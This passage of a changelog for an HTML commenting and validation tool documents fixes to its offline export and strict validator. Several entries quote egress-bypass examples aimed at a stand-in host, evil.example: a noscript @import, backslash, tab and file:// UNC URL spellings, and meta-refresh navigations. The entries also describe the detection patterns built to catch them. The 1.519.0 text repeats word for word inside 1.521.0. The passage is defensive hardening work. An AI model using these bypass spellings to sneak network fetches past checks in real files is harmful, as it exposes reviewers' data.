  breakout, or end of input. An implicitly closed `<p id="commentRoot">` used to leave a stale root
  index, so the section wrapping rewrote the sibling content a browser puts outside the root; a
  self-closed void tag (`<hr/>`) now closes an open `<p>` instead of being short-circuited, so a
  `cm-skip` subtree no longer stays open over content a reader can comment on; only the element's
  OWN end tag is part of its span, so a rewrite no longer deletes an ancestor's closer; and the
  extent of an end tag comes from the shared quote-aware scan, so `</nav a=">">` ends at the second
  `>` rather than leaving a stray `">` behind.


## [1.552.0] - 2026-08-04

### Added

- An `Auto-open panel on comment` preference in the comments panel's `More` menu, with a
  cross-document default and a per-document override. The panel has always opened when a comment
  is saved, which is the right default but leaves a reviewer who reads full width with the panel
  collapsed no way to turn it off. `More` now opens a `Preferences` group holding two
  `role="menuitemcheckbox"` rows: `Auto-open panel on comment` writes the DEFAULT for every
  commentable-html document in this browser, and the indented `Override for this document` row
  under it decides the scope - unchecked, this document follows the default; checked, it pins the
  value that differs from the default and its label carries that document-local state
  (`Override for this document: Off`) while the default row keeps showing the untouched default, so
  the two scopes never look like the same setting. Unchecking the override drops the per-document
  key and the document re-inherits. With the preference off a saved comment is still stored, still
  highlighted, and still carded - only the panel stays where the reviewer left it; every explicit
  Show/panel action and the storage manager's pending-quota auto-open are unaffected, and the deck
  runtime honors it too (its present-only `Comments off` lock still surfaces the panel for a
  comment that lands there, so none is ever stranded). The preference governs every path where the panel opens ITSELF, not just the
  save: with it off, reopening a document that already carries comments, note changes, or checklist
  changes leaves the panel closed, and a first review-note, checklist, or widget layout change no
  longer yanks it open either. Nothing stored means ON, so an existing document behaves exactly as
  it did. Both rows toggle in place without closing the menu, expose
  `aria-checked`, are keyboard operable, and take part in a new roving focus (Arrow Up/Down,
  Home/End) across the `More` menu. Every read and write of both keys is `try/catch` guarded, so a
  browser that denies storage degrades to the ON default instead of throwing
  Both rows sit in a real ARIA menu (`role="menu"` with
  `role="menuitem"` actions and one roving tab stop), and a refused write raises a toast with a
  Manage-storage action instead of silently snapping the row back (`CMH-MENU-PREF-01..09`).

## [1.540.0] - 2026-08-04

### Changed

- The layer's reserved data blocks now answer to ONE recorded ownership rule, and the one state it
  used to settle in silence is reported. The content-root boundary decides which element is the
  layer's own block for the embedded-comments, handled-ids and review-state blocks, on the load
  path and the export path alike; the review-state block asks for EMBEDDED COMMENTS region
  ownership on top of that, and the comments and handled-ids blocks deliberately do not, because
  the failure costs are not symmetric - declining the review state omits an accessory from the copy
  being written, while declining the comments payload would strand the reader's comments and block
  the very export that would save them. A document whose region markers no longer resolve therefore
  still loads and re-exports its comments while its review state is left out with a named reason,
  and that divergence is now pinned by a test rather than left to be re-derived. A document that
  carries MORE THAN ONE block the layer owns for a data id is now reported once per id, on the
  console (and to the reader in one deferred toast that names every affected id, since a single
  toast surface means a per-id message raised inside startup would be wiped before it was read):
  the first block is the one read, and for the embedded-comments block it is the one the export
  rewrites, so the rest were stale on load and never saved, silently and forever. The count is
  asked again once the document is fully parsed, so a duplicate sitting after the layer's own
  script is reported too. The layer descriptor is deliberately
  outside the rule, since an export that declares a mode maintains additional descriptor copies on
  purpose.
- The Plain export's data-safety net now names the reserved block that survived the strip and where
  it sat, instead of always blaming malformed markers: OUTSIDE its region (where no region strip
  could ever remove it, the commonest cause), INSIDE its region (so the markers resolve and the
  region text could not be matched - prose before either marker inside its own HTML comment does
  exactly that, so the message states the requirement both anchors share instead of blaming one),
  unattributable (the document does not expose the block as one of the layer's own, which is not a
  marker problem), or "the region markers are not one ordered pair". The remedy is part of the
  diagnosis: moving a block into its region is only suggested when it is the document's sole block
  of that id, since moving a duplicate could place it ahead of the real one. The layer descriptor
  is asked the same question against every region rather than declared region-less on trust, and a
  contested content root keeps its own wording and pays for no extra parse. The placement is judged
  on the source document, because a strip that worked leaves no markers in the copy to judge by.

### Fixed

- The four implementations that locate a region marker - the runtime, the validator, the shipped
  authoring tools and the maintainer-only build tool - are now pinned to one canonical corpus, and
  the divergence that pinning exposed is fixed: the three Python copies split lines with
  `str.splitlines()`, which also breaks on `\x0b`, `\x0c`, `\x1c`, `\x1d`, `\x1e`, `\x85`, `\u2028`
  and `\u2029` and treats a lone `\r` as a terminator, while the runtime's raw-text scan breaks on
  `\n` only. A marker "line" that existed only after one of those
  splits was counted by the validator, the build and the upgrade tool and ignored by the runtime
  that reads the file back - two views disagreeing about which comment IS the boundary. The Python
  copies now use the runtime's line concept, and share one `_MarkerMatch.start(group)` /
  `end(group)` signature that refuses any group but 0 or 1 rather than answering a wrong one. Two
  bounds are recorded rather than papered over: the corpus stays inside the Basic Multilingual
  Plane (JavaScript indexes UTF-16 code units and Python indexes code points), and `validate.py`
  and `upgrade.py` still READ their input with Python's universal newlines, so on those CLI paths a
  lone carriage return is an `\n` before any check sees it.

## [1.531.0] - 2026-08-04

### Fixed

- An oversized numeric character reference in the document's TEXT no longer fails the validator's
  parse closed. The validator's tolerant parsers read text with `convert_charrefs=True`, which hands
  every text run to `html.unescape()` - and that RAISES on a numeric reference with more digits than
  Python's integer conversion limit, so one such reference in prose reported the whole document as
  "could not be parsed as HTML" and hid every finding in it, where a browser simply renders U+FFFD
  and reads on. The attribute path already resolved the same shape by the browser rule (1.437.0);
  text now uses the SAME bounded end state, so `&#<5000 nines>;` in prose is U+FFFD and the rest of
  the document stays live. The same change stops `html.unescape` DELETING the code points it deems
  invalid from the text the checks read, so a control character or noncharacter a browser keeps
  (`&#1;`, `&#x7f;`, `&#xfffe;`) reaches the checks as the document really carries it. Named
  references are unchanged - they keep `html.unescape`'s longest-match rule, which is the text rule
  (`&notit;` is `\u00ac` + `it;`, deliberately not the attribute rule). Raw offsets are untouched:
  the fix re-binds the single `unescape` global of the host's own `goahead` rather than rewriting the
  parser's buffer or changing how text runs are delivered, so the tokenizer stays byte-for-byte the
  host's and `code_block_spans()` / `content_marker_scan()` still read exact offsets into the
  original document. The theme-contrast scan reads text through the same bounded decode, and its start
  tags already shared the validator's start-tag base (1.527.0), so it refuses neither shape any
  more - and the "could not be read for contrast" error that stood in for that refusal is retired
  with it. The same binding reaches the authoring and deck tools
  (`section_hash.py`, `doc_stats.py`, `generate_toc.py`, `new_document.py`, `retrofit.py`,
  `upgrade.py`, `_favicon.py`, `deck/deck_validate.py`) through the shared shim, so a document that
  validates clean can also be stamped, hashed, counted, indexed, retrofitted and upgraded instead of
  failing one step later.
- The validator's title requirement for a `report`/`plan` now asks for VISIBLE title text: an `<h1>`
  whose text is only whitespace, controls, format characters (a zero-width space, a bidi mark, a
  BOM) or unassigned/noncharacter code points no longer satisfies it. Those characters reach the
  check at all because a text reference is decoded by the browser rule instead of being deleted, so
  without this an `<h1>&#1;</h1>` would pass as a title nobody can see. U+FFFD still counts as
  visible, because a browser draws the replacement glyph. The contrast scan asks the same question
  through the same shared rule, so an element whose only text is invisible is no longer reported as
  low-contrast text nobody can see, and `highlight_document.py` (the one path that decodes document
  text and WRITES it back) and `upgrade.py`'s `data-doc-source` decode both read through the shared
  rules too, so highlighting or upgrading such a document neither crashes nor silently deletes a
  code point a browser keeps.

## [1.530.0] - 2026-08-04

### Fixed

- The strict validator's OFFLINE mode now sees CSS inside a `<noscript>` fallback. A `<noscript>`
  body is raw TEXT only while scripting is ENABLED; with scripting off a browser parses it and
  really does fetch what its CSS names. The element lookups already asked that EGRESS question,
  but the CSS scans still read the scripting-enabled document view, so
  `<noscript><style>@import url(https://evil.example/x.css)</style></noscript>` and a network
  `url(...)` in a `style=` attribute inside a fallback both passed `--strict` as offline-clean -
  live egress for exactly the reader who cannot run the layer. The shared tag index now also
  collects the `<style>` bodies its scripting-disabled pass parses, and the offline `@import`,
  style-block `url(...)` and inline-style `url(...)` scans read that fallback view alongside the
  document and template views. PRESENCE checks are unchanged: they keep reading the browser's
  scripting-enabled view, so a CSP `<meta>` buried in a `<noscript>` still cannot satisfy a
  requirement no reader of the layer can see. The two views can also disagree about the REST OF
  THE DOCUMENT after a fallback body: its end is decided by the scripting-enabled tokenizer at the
  first `</noscript`, but a scripting-disabled browser arrives there in whatever state its own
  parse of the fallback markup left it in. Unless that state is the data state - it is still
  inside a `<style>`, another raw-text element, or a comment - the two tokenizers part company and
  a reference after the seam is live for that reader while being invisible to both views. Such a
  document is now REPORTED ("could not parse the document for the self-contained resource checks")
  rather than certified offline-clean. A `<noscript>` that simply runs to the end of the document
  is unaffected. The trade is that a fallback stylesheet containing a literal `</noscript` (in a
  `content:` string, say) can no longer be certified either; encode it (`\3C\2F noscript`) or
  split it, since a browser cannot tell the two apart at that point either.

## [1.527.0] - 2026-08-04

### Fixed

- The theme-contrast scan no longer goes silent on a document carrying an oversized numeric
  character reference in an attribute value. Its two scanners were the last parse path in the
  validator still built on a bare `html.parser.HTMLParser`, so the host decoded their attribute
  values and RAISED on a reference with more digits than Python's integer conversion limit - a
  shape the rest of the validator resolves to U+FFFD and reads straight through, as a browser
  does. Because the check degrades any failure to "no findings" by contract (an advisory must
  never abort a run), one attribute disabled the whole check on a document every other parse
  reads. The scanners now derive from the same start-tag base the checks package uses, whose tag
  extent comes from the vendored tokenizer and whose numeric decode is bounded. They reach it
  through the existing `tools/_browser_attrs.py` shim rather than importing `checks` directly,
  because `cmhval` is a sibling package that must stay independently importable and `checks`
  already imports it, so the direct import would be a cycle; a partial install still degrades to
  the host's own parser with the standard missing-tool warning. One shape stays reported rather
  than read: a reference in the scan's TEXT still reaches the host's own decode. Through
  `validate()` that document never reaches the check (the document parse fails first and the run
  reports a parse failure), so the report is for a direct caller of the standalone check, which
  would otherwise be handed an empty finding list for a document nothing read.

## [1.525.0] - 2026-08-04

### Fixed

- A toast can no longer become invisible-but-operable focus behind a modal dialog. The toast and
  `.cm-modal-overlay` both sat at `z-index: 300`, so which one painted on top was decided purely by
  DOM order: a toast raised BEFORE a dialog opened was drawn UNDER the dialog's scrim while its
  action button stayed focusable and clickable. The toast layer now sits above the overlay
  (`z-index: 320`, still below the tooltip layer), so a recovery toast stays visible and hit-testable
  on top of a dialog instead of holding focus a reviewer cannot see.
- A Manage storage dialog opened from a toast action no longer strands keyboard focus. `showToast()`
  removes the action button before running its handler, so `document.activeElement` was `<body>` by
  the time the dialog snapshotted it and its restore-on-close was a silent no-op. The toast now
  resolves a focus-restore target first and hands it to the action, `cmhStorageAction()` forwards it
  as `restoreFocus`, and the manager's `close()` re-resolves it - falling back to the stable chrome
  triggers (`More`, the toolbar overflow, the panel toggle) when the snapshot is missing, detached,
  hidden, or disabled - so closing the dialog always lands on a real, visible control.

## [1.522.0] - 2026-08-03

### Fixed

- An injected `<base href>` can no longer rebase the relative references the Offline export strip
  and the strict validator both treat as safe. Neither side looked at a base element - it loads
  nothing itself - and both deliberately leave a RELATIVE reference alone, so a single base element
  naming a remote host turned every relative image and SVG script reference in the document into an
  off-host fetch while passing both checks as local. The export now clears a non-local base `href`
  through the same template-walking pass as every other load (a parked base starts rebasing the
  moment a script adopts the fragment), and `validate.py --strict` flags the same shape, so the
  exporter and the gate agree. Three bounds are deliberate. A base is held to a STRICTER predicate
  than the per-resource passes - the same "non-local reference" rule the import-map check uses (any
  scheme, or an authority of two slashes or backslashes in either order, after the URL parser's own
  input cleanup) - because one attribute re-points EVERY safe reference in the document, so the
  slash-less, one-slash, backslash-authority, `file://` UNC and `blob:`/`data:` spellings a browser
  still resolves to a remote host cannot be left to the CSP the way a single attribute can. The
  href alone is cleared rather than the element removed: a `target` is not egress, and a relative
  base reaches no network at all. And the validator's copy is not scoped to
  offline mode, because the self-contained guarantee is not offline-only and a shareable file has no
  zero-network CSP behind it. Clearing a base is also the one attribute pass the download toast
  names, because it re-points references that still work - author links included - and outside
  offline mode the gate suggests making the base relative rather than simply removing it. The
  offline CSP's `base-uri 'none'` covers the same channel as defense
  in depth, but a policy delivered in a `<meta>` does not bind a base element the parser already
  resolved before it, and the strip and the gate are the layer that is not supposed to depend on the
  CSP anyway.

## [1.521.0] - 2026-08-04

### Fixed

- The strict validator's OFFLINE mode now closes three parity gaps against the offline export, so a
  hand-authored offline file cannot pass `--strict` in a shape an export would have changed.
  (1) Inline event handlers are read off the shared EGRESS tag index instead of a second collection
  of the same attributes in the document parser, so the gate now sees the two shapes the exporter's
  `querySelectorAll("*")` walk reaches and that scan did not: an `on*` on a self-closed FOREIGN
  element (an `onload` on an SVG `<rect/>`) and one on any
  element inside a `<noscript>` fallback body, which is raw TEXT to a scripting-enabled parse but
  live markup for the reader who cannot run the layer at all. Both used to be certified as
  offline-clean, and an inline handler is exactly the channel the offline CSP cannot close.
  (2) The meta-refresh rule now agrees in BOTH directions: offline mode rejects EVERY
  refresh meta, matching the export, which removes every one whatever its target.
  A relative refresh is still a top-level navigation no meta-delivered policy can restrict, and an
  injected `<base href>` rebases it onto the network, so it was never safe on the strength of being
  relative; the network-target parser is kept and now decides only which of the two messages the
  rejection carries.
  (3) A `<template>`-parked `<script>`/`<style>` body is now regression-locked on the parser as
  never reaching the `#commentRoot` prose view (it lands only in the template-only views the
  offline checks read). The exclusion itself shipped in 1.514.x; what is new here is the pin, so
  the raw-text fall-through the prose rule has to cover cannot come back unnoticed. The mermaid
  SOURCE view is the known remainder of the same family and is tracked separately.
- Opening, closing or saving a comment composer no longer jumps the document. The browser's scroll
  anchoring watched the layout change composer creation makes (the preview marks over the selection,
  the appended surface) and shifted `window.scrollY` to keep its own chosen anchor in place - but it
  did so AFTER the composer had been positioned from the selection's rect, so the selected text slid
  toward the top of the viewport while the fixed composer stayed where it was and the two came
  apart. The reproduction was position-dependent (an anchor near the middle of the viewport moved,
  the same anchor near the top or bottom did not), which is what made it feel intermittent. Opening,
  closing and saving now each run inside a scroll guard that makes the CONTENT ROOT ineligible as a
  scroll anchor while the document is being mutated, puts back any inline `overflow-anchor` the host
  document had, and hands anchoring back once the mutation has been through a layout frame - so the
  reader keeps their place and scroll anchoring keeps working everywhere else. Closing and saving
  are covered because they mutate the same document in reverse: guarding only the open path would
  have moved the jump to the cancel click rather than removing it.

## [1.519.0] - 2026-08-03

### Fixed

- The strict validator's OFFLINE mode now closes three parity gaps against the offline export, so a
  hand-authored offline file cannot pass `--strict` in a shape an export would have changed.
  (1) Inline event handlers are read off the shared EGRESS tag index instead of a second collection
  of the same attributes in the document parser, so the gate now sees the two shapes the exporter's
  `querySelectorAll("*")` walk reaches and that scan did not: an `on*` on a self-closed FOREIGN
  element (an `onload` on an SVG `<rect/>`) and one on any
  element inside a `<noscript>` fallback body, which is raw TEXT to a scripting-enabled parse but
  live markup for the reader who cannot run the layer at all. Both used to be certified as
  offline-clean, and an inline handler is exactly the channel the offline CSP cannot close.
  (2) The meta-refresh rule now agrees in BOTH directions: offline mode rejects EVERY
  refresh meta, matching the export, which removes every one whatever its target.
  A relative refresh is still a top-level navigation no meta-delivered policy can restrict, and an
  injected `<base href>` rebases it onto the network, so it was never safe on the strength of being
  relative; the network-target parser is kept and now decides only which of the two messages the
  rejection carries.
  (3) A `<template>`-parked `<script>`/`<style>` body is now regression-locked on the parser as
  never reaching the `#commentRoot` prose view (it lands only in the template-only views the
  offline checks read). The exclusion itself shipped in 1.514.x; what is new here is the pin, so
  the raw-text fall-through the prose rule has to cover cannot come back unnoticed. The mermaid
  SOURCE view is the known remainder of the same family and is tracked separately.

## [1.518.0] - 2026-08-03

### Fixed

- The offline strip and the strict validator now read a reference the way a browser's URL parser
  does before deciding whether it loads over the network, so the spellings a browser NORMALIZES
  into a network URL are no longer read as local. Both sides tested the raw literal for
  `(?:https?:)?//`, so `https:/\evil.example/x.js` (a backslash opens an authority for a special
  scheme exactly as a slash does - verified fetching `https://evil.example/x.js` in a real
  Chromium), the scheme-relative `\\evil.example/x.js`, a value carrying an embedded ASCII tab, CR
  or LF (`ht<tab>tps://evil.example/x.js`), and `file://host/x.js` (an SMB UNC fetch off the
  machine on Windows) were all called local by the exporter AND certified as offline-clean by
  `validate.py --strict`. Each value is now cleaned up first - leading and trailing C0-or-space
  stripped, ASCII tab/LF/CR removed from anywhere, every backslash mapped onto a slash - and an
  explicit `file:` authority counts as a network load. How many separators open that authority was
  checked in a real Chromium rather than read off the spec, because the answer is not "two or
  more": exactly two, or FOUR-or-more, give a host, while THREE is the empty host of an ordinary
  local path, so `file:////evil.example/x.js` fetches too. The spellings that stay ON the machine
  are still local - an empty host (`file:///C:/x`), `localhost`, and a Windows drive letter in the
  host position (`file://C:/x`, `file://c|/x`, which the URL parser turns into a path) - as is any
  value whose authority is empty because it ends at once (`//?q`, `https://`, and the Windows
  extended-length path `\\?\C:\x`), since a special scheme fails to parse there and fetches
  nothing. `srcset` is fixed at its own boundary: HTML tokenizes candidates on ASCII whitespace
  ONLY, and both implementations split on their engine's whitespace instead, so a candidate written
  with a U+000B was cut there and its load was hidden from both - and the two engines disagreed
  about the rest (Python's `str.strip()` takes U+001C-U+001F, JavaScript's `trim()` takes U+FEFF).
  Splitting on the COMMA was wrong too: HTML collects a run of non-whitespace as the URL, so
  `srcset="https://,host/x.png 1x"` really does request `https://,host/x.png`, and the comma-split
  tested only the truncated `https://`. Both readings are now taken.
  This covers every attribute both implementations read, including `img`/`iframe`/media `src` and
  `srcset`, `video poster`, `object data`, `embed src`, legacy `background`, `link href`, form
  `action`/`formaction`, and the script `src`/`href`/`xlink:href` set - not only scripts. The
  zero-network CSP already blocked the fetch in an exported file, so this is defense in depth - but
  the strip and the gate are the layer that is not supposed to depend on the CSP.

## [1.516.0] - 2026-08-03

### Fixed

- The `reviewedSections` block is now resolved against the CONTENT-ROOT BOUNDARY as well as the
  EMBEDDED COMMENTS region that owns it, on the load side and the export side alike, so a
  `<script id="reviewedSections">` a document author put INSIDE `#commentRoot` can never answer for
  the layer's own review state. The region rule already ignored such a decoy in a document that
  carries its region markers, but it deliberately let a LONE block resolve when the markers are
  ABSENT (so a file upgraded from before the regions existed keeps working) - and in that shape the
  only block left could be the authored one, which was then read back as the reader's review marks.
  A CONTESTED content root (more than one element carrying the content-root id) now resolves
  nothing at all rather than falling back to document position, matching how the embedded-comments
  and descriptor blocks already behave, and the reader is told once, in a toast and on the console,
  which ONE state the document is in - the load warning and the export's download toast now come
  from a single shared diagnosis, so they name the same cause instead of listing every possible one.
- A document with no `reviewedSections` block at all gets one inserted again when its content
  carries an `embeddedComments` decoy. The insert anchors on the `embeddedComments` block the
  region owns and refused to anchor when more than one element carried that id anywhere - counting
  authored content the exporter itself ignores, so a single decoy inside the content root
  permanently stopped the reader's review state from travelling with an exported copy. It now
  counts only the blocks the layer owns, which is the same set the exporter writes the comments
  into.

## [1.515.0] - 2026-08-03

### Fixed

- The layer's OWN controls injected INSIDE the content root no longer lose the reviewer's first
  click to an open comment dialog. Inverting the dismiss to swallow only clicks in the annotated
  document gave every surface OUTSIDE the content root its first click back, but a sortable-table
  sort control, a widget "Reset moves", a checklist box, an editable note, a code-block Copy, a
  section caret or review badge, and a rendered diff's view toolbar all live inside that root, where
  containment cannot tell them from author content - so with a dialog open the first click on one of
  them was spent closing the dialog and the control did nothing. The layer now registers each
  control it creates in an identity set and carves that set out of the swallow, so the control acts
  on the FIRST click (in the `<body>`-fallback mode too). Identity, not class: document content
  carrying `cmh-sort-ctrl` or `cm-widget-reset` is still author content and is still swallowed, so
  the anti-spoofing property is unchanged. A spared click then behaves exactly as it does with no
  dialog open - the carve-out restores the normal click rather than making the control modal - and
  a behavior the runtime attaches to AUTHOR content (clicking a commented image to jump to its
  card, clicking a collapsed section's heading rather than its caret) is not an injected control
  and is still swallowed.
## [1.514.0] - 2026-08-03

### Fixed

- Sorting a table no longer changes the document's text. Rows are now permuted through their
  existing slots instead of being appended to the table body, so the whitespace an author leaves
  BETWEEN rows stays where it is. Previously one sort stranded all of that whitespace ahead of the
  rows, making them textually adjacent - a change unsorting could not undo - so the document and
  section content hashes drifted permanently. Because a sort is remembered per browser profile,
  the same file then showed the amber "This document was not validated in its current form" banner
  on the computer where a table had been sorted and not on another, and a sorted table could flip
  an already-reviewed section to "changed".
- Section review state now hashes the same canonical (authored source-order) content the validation
  banner does, so a reader's persisted table sort can no longer flip an already-reviewed section to
  "changed" (and a section marked reviewed while a table was sorted no longer flips when the sort is
  cleared). The canonical order is read from the stamped row indices rather than restored by moving
  rows, so a badge refresh never disturbs the reader's sorted view, focus, or text selection. One
  upgrade note: a section marked reviewed by an older build WHILE a table was sorted was recorded
  against the sorted order, so it shows "changed" once after this upgrade; re-marking it stores the
  canonical hash and it stays reviewed from then on.

## [1.512.0] - 2026-08-03

### Fixed

- The strict validator now decides an offline-mode `<meta http-equiv="refresh">` target by applying
  the HTML refresh algorithm instead of matching `url=` in the raw attribute text, which was wrong
  in both directions. A browser resolves `content="0;url=https:evil.example"` in a `file://`
  document to `https://evil.example/` and navigates the whole document - every reviewer comment
  with it - there, but the gate required a `//` after the scheme, so a hand-authored offline file
  carrying that meta passed `validate.py --strict` unflagged. The `url=` keyword is optional in
  that algorithm as well, so simply dropping it (`content="0;https://evil.example"`) was an even
  cheaper bypass, and a remote authority reached the same beacon through `\\host` or an explicit
  `file://host` UNC target. A meta refresh is a TOP-LEVEL NAVIGATION, the one egress channel no
  meta-delivered CSP can close, so the gate was the only thing that would have caught any of them.
  In the other direction, a refresh with no time is not a refresh at all, a quoted value is
  truncated at its closing quote, a near miss on the `url` keyword is an ordinary relative
  reference, only ASCII whitespace separates the keyword from its `=`, and a bare `https:` with no
  host navigates nowhere - all of those used to be reported as network egress and now pass. The
  export was never affected (it removes every refresh meta whatever its URL), so this closes a
  validator-only false negative and the gate stays looser than the strip it mirrors. The
  neighbouring CSS and attribute network-literal gates deliberately keep their slashes-required
  shape - those are fetch channels the offline CSP closes, and each is byte-mirrored in the
  exporter, so gate and strip have to move together (tracked separately).

## [1.509.0] - 2026-08-03

### Security

- The offline export's scripted-navigation strip - the one egress channel the offline
  Content-Security-Policy cannot close - now also recognizes a URL literal that is NORMALIZED into a
  network URL before anything resolves it, whether by the URL parser or by the JavaScript parser
  that produced the string. Five shapes reached a network host with no aliasing, no computed access
  and no runtime assembly, just the URL spelled with one extra character: leading C0-or-space
  padding (`" https://host"`), which the URL parser strips; an ASCII tab, LF or CR anywhere inside
  the scheme or between the authority slashes (`"ht<tab>tps://host"`), which the parser removes from
  its whole input; a backslash in place of either authority slash, which it treats exactly like a
  slash for a special scheme; a LineContinuation (a backslash followed by a line terminator), which
  evaluates to nothing at all; and an escaping backslash before any character of the literal
  (`"\https://host"`), because a backslash before a character that begins no escape sequence
  evaluates to that character. That last one was the cheapest of all and would have defeated the
  other four at once. Because the strict validator carries the same pattern byte for byte,
  `validate.py --strict` used to certify a hand-authored offline file that kept any of them as
  offline-clean; both copies now recognize all five.
- U+0000 is deliberately NOT treated as padding: the HTML parser turns a NUL in script data into
  U+FFFD, so a NUL-padded literal cannot navigate, and matching it would only make the validator -
  which reads the raw text - reject a document the exporter, which reads the parsed text, preserves.
  What remains residual is the class raw source genuinely cannot read: a MULTI-character escape that
  ENCODES one of those characters (`\u0068`, `\x68`, an octal), which needs a string-literal decoder
  rather than a regex; and a `javascript:` wrapper, which is left out as a deliberate trade, since
  the URL is not in the source at all and a script able to write one already runs arbitrary code.
- The widening cannot backtrack superlinearly: every added run is separated from its neighbour by a
  mandatory literal element, and each run's two alternatives are told apart by their second
  character. It does not delete the benign scripts an author actually writes - a padded URL that is
  only displayed, a navigation to a local fragment, a single-backslash local path, a real backslash
  before a scheme and a shadowed `location` all still survive - and it keeps the over-match this
  strip has always chosen: a host-less `"//"` reference goes too, because requiring a host character
  would start preserving a protocol-relative prefix concatenated with a host at the sink.

## [1.499.0] - 2026-08-03

### Fixed

- The validator's tolerant parsers still let the HOST decide where a start tag ENDS, so the same
  bytes could tokenize differently on Python 3.12 and 3.13+. `html.parser` answers that question
  with `check_for_whole_start_tag()`, which reads whichever regex the interpreter ships
  (`locatestarttagend_tolerant` before 3.13, `locatetagend` from 3.13), and neither is a browser's
  rule. Two shapes drove real divergence: a NUL in a tag name (pre-3.13 stops the name there, so
  `<script\0>` opens a raw-text region that swallows the rest of the document, while 3.13 keeps the
  NUL - a browser writes U+FFFD, in a tag name, an attribute name and an attribute value alike),
  and an unterminated quoted attribute value (a browser runs the value to its matching quote, meets
  end of input, and applies the HTML5 eof-in-tag error that DISCARDS the whole tag; both hosts
  instead fail to match a value, re-read what follows as further attribute NAMES, and close the tag
  at the next `>`, resurrecting elements a browser never builds). The tag-open, tag-name,
  attribute-name, attribute-value and self-closing states are now scanned explicitly, and the whole
  `parse_starttag()` is vendored around them - the host derives the tag NAME with its own regex and
  falls back to emitting a tag's SOURCE AS DATA, so replacing only the extent would not have closed
  it. Every parser in the checks package that reads attributes now shares that one base, so the
  document parser, the code-block spans, the tag lookup and the checklist, notes and density passes
  can no longer disagree about where an element begins, and the oversized-reference recovery path -
  the one place a start tag still reaches the host's own machinery - draws the same boundary. A start tag truncated at end of input is
  still discarded, and mid-stream one still waits for more data, so an incremental caller cannot
  lose a tag split across two feed chunks; a reused parser's `reset()` clears that end-of-input
  flag, so the next document is not read as already finished.
- WHICH elements hold raw text is deliberately unchanged: the shared base enters raw text exactly
  as the host's own `parse_starttag()` would, because getting that right without a namespace
  stack is not possible - an `<svg><title>` is an HTML integration point whose children a browser
  really does build. The tolerant passes keep applying the browser set from their own
  `handle_starttag()`, where the namespace is known.
- The vendored scanner folds the tag name ASCII-only, since it is now the code that names the
  element. `str.lower()` folds U+212A KELVIN SIGN to an ASCII "k", so `<scrip\u212a>` would have
  opened a raw-text region that a browser - which builds an unknown element there - never opens.

## [1.486.0] - 2026-08-03

### Fixed

- The offline export's scripted-navigation check is now LINEAR on a long near-match, in both the
  exporter (JavaScript) and the strict validator (Python). It carried the global-prefix chain
  (`window`, `self`, `top`, `parent`, `globalThis`, `document`, `frames`) as an unbounded
  repetition in front of the sink, so the engine re-entered that chain at every position a prefix
  could follow and a near-match that never reaches a sink cost QUADRATIC time: `window . ` repeated
  measured 2.3s at 18 KB, 9.4s at 36 KB, 36s at 72 KB and 174s at 144 KB - 4x the time for 2x the
  input.
  - Both callers feed it unbounded document-supplied text: the loader strip runs it over every
    runnable inline script, and the vendored-payload gate runs it over the payload's INFLATED
    bytes, where a few hundred base64 bytes buy megabytes of near-match. The export runs in the
    reviewer's own browser on a document whose own scripts already ran, so this was a stall of the
    Export Offline action rather than an escalation - but an export that appears to hang is
    indistinguishable from a broken feature.
  - Every shape it recognizes requires the literal `location` or `open`, so recognition is now a
    SCAN driven from those anchors: forward from an anchor the tail is a regex matched ANCHORED at
    that offset (every unbounded whitespace run is followed by a distinct non-whitespace literal,
    so no run can be split two ways), and backward from an anchor the prefix chain is walked once
    in code. Chains for two different anchors cannot overlap, because no sink name is a prefix
    name. The same input now costs 0.08s at 1.8 MB in Python and 2ms in node.
  - The recognized shapes are unchanged, pinned in both directions against the pattern the scan
    replaced over a crossed corpus of sinks and near-sinks, so no egress case stopped matching and
    no benign script started being stripped. The two implementations still agree literal for
    literal, and the walk that joins those literals is pinned by running the exporter's own source
    in node.
  - The regression test measures the SCALING at 10x steps rather than one fixed size, which is why
    the quadratic term survived the earlier catastrophic-backtracking guard (it used ~200
    repetitions, far below where the growth is visible).
## [1.485.0] - 2026-08-03

### Fixed

- The validator no longer lets a comment the marker COUNT views do not see forge a
  `commentable-html` region marker. A browser turns `<!BEGIN: commentable-html - CONTENT ...>`,
  `<?END: commentable-html - JS>` and `</ END: commentable-html - JS>` into bogus COMMENT nodes,
  and the parser correctly routed each to its comment handler - but the handler then treated any
  comment whose TEXT matched a marker as that marker, while the counting views match the exact
  source the authoring tools emit. So a forged declaration, or a real but uncounted
  `<!--BEGIN: ...-->` / `<!-- BEGIN: ... --!>`, could open or close the CONTENT region (letting a
  document whose counted `BEGIN` marker sits outside `#commentRoot` validate completely clean) or
  set the `END: commentable-html - JS` boundary early (silencing the chart-init guard for every
  `new Chart(` between the forged marker and the counted one). A comment now carries its own
  SOURCE through the shared boundary layer, recorded only on the real `<!--` path - so every other
  route, including the end-of-input fallbacks, is bogus by default and fails closed - and a marker
  must be a comment those views count.

## [1.470.0] - 2026-08-03

### Fixed

- A sidebar re-render that lands while a modal dialog is open (Manage storage, the clear-all
  confirm, Help) no longer hands keyboard focus to the side pane BEHIND that dialog's overlay
  (issue #884). The pane restores an in-progress inline reply/edit draft and its selection across
  a re-render, and re-focuses that editor when it owned focus beforehand; with an `aria-modal`
  dialog up, the pane is behind the overlay, so the editor's ownership is vetoed for the whole
  rebuild and the deferred focus stands down. The veto also applies at DELIVERY time - the editor's
  deferred focus timer, the post-save hand-back, and an editor's close-restore all stand down while
  a dialog is up - so a focus armed before the dialog opened cannot land behind it either, and that
  focus is HELD rather than dropped, so closing the dialog leaves the reviewer on a real control
  instead of stranded. Focus found BEHIND the overlay (stranded on `<body>`, in the side pane, or
  moved out into the document by a delete run FROM the dialog) is handed back to it, preferring the
  dialog's own declared safe default over raw DOM order so a destructive confirm button is never
  made the Enter-default, skipping any candidate that cannot actually take focus; focus the reviewer
  genuinely holds inside the dialog, or on chrome that paints above the overlay, is left alone. The
  rule is keyed on the rendered `aria-modal` overlay, so it covers Manage storage, the clear-all
  confirm, and Help alike. Without this, a keyboard or screen-reader reviewer could be left typing
  into an invisible, unreachable textarea outside the modal.




## [1.437.0] - 2026-08-03

### Fixed

- The validator no longer reads inert `<template>` content as `#commentRoot` prose, nor as heading
  text. A template's contents live in a DocumentFragment a browser never renders, and the parser's
  element view already declined them, but the PROSE and HEADING views did not - so a document that
  merely SHOWED a section cross reference inside a template (a doc about authoring, or any parked
  markup fragment) raised an "unlinked cross-reference" warning its author could not clear by any
  edit to the rendered page, and a template nested inside a heading contributed invisible text to
  the heading the named-cross-reference and document-title checks read. Both now apply the same
  inertness rule as the element view, whether the template is closed or left open at end of input.
